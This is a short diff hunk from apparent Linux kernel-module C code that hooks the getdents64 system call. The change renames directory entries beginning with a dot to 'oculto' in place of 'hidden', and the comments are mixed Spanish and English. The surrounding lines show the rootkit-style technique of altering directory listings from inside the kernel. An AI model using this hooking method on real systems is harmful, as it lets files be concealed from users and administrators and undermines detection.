@@ -78,7 +78,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 		en Linux es un estandar "ocultar" archivos con el punto */
         if (current_dir->d_name[0] == '.')
         {
-            strncpy(current_dir->d_name, "hidden", 6);
+            strncpy(current_dir->d_name, "oculto", 6);
             current_dir->d_name[6] = '\0';
         }
         /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
